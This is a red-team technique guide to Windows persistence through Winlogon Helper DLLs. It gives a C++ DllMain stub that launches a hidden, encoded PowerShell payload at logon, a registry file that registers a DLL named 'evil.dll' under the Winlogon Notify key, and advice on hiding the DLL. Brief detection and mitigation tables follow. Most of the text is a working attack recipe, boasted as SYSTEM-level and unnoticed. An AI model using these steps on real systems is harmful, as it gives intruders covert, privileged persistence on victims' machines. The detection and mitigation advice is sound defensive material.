# 🧩 Winlogon Helper DLL - Deep Windows Logon Persistence

**Winlogon Helper DLL** persistence hijacks the Windows logon process by injecting a custom DLL that is automatically loaded whenever a user logs in. It’s stealthy, runs with high privileges, and is ideal for **long-term implants** or **covert execution**.

> ⚠️ APT-level technique. Used by real malware and red teams. Sits quietly inside the logon path — no services, tasks, or files run directly.

---

## 🛠️ What It Does
- The `Winlogon.exe` process loads registered DLLs listed in:
```reg
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
```
- Each entry can point to a DLL that’s called during logon events (`Logon`, `Logoff`, `Startup`, etc.)
- DLL runs with SYSTEM privileges

---

## 💣 Persistence Example
### 1. Write a Malicious DLL
```cpp
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if(fdwReason == DLL_PROCESS_ATTACH) {
    WinExec("powershell -nop -w hidden -enc <payload>", 0);
  }
  return TRUE;
}
```
✅ Runs at every logon invisibly

---

### 2. Register the DLL in Registry
```reg
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\EvilNotify]
"DLLName"="evil.dll"
"Logon"="Handler"
"Impersonate"=dword:00000001
"Asynchronous"=dword:00000001
```
✅ You can place the DLL in `System32`, `ProgramData`, or a hidden folder

---

### 3. Trigger via Logon
- As soon as a user logs in — SYSTEM executes your DLL silently
- No extra processes, no visible startup entries

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Unexpected entries in `Winlogon\Notify` | Monitor registry for new keys or unknown DLL paths |
| DLLs loaded by `winlogon.exe` | Use Sysmon Event ID 7 (ImageLoad) to catch untrusted DLL loads |
| DLLs in non-standard locations | Flag anything not in `%SystemRoot%` or `Program Files`

---

## 🔐 Mitigation Strategies
- Monitor and restrict write access to `Winlogon\Notify`
- Set alerts for unsigned DLLs in that path
- Enable system integrity enforcement (WDAC/AppLocker)
- Regularly diff and audit registry entries related to Winlogon

---

> 🧠 This technique is a sleeper cell in your OS. It runs at logon. It runs as SYSTEM. And unless someone’s looking at obscure registry keys — **no one ever notices.**
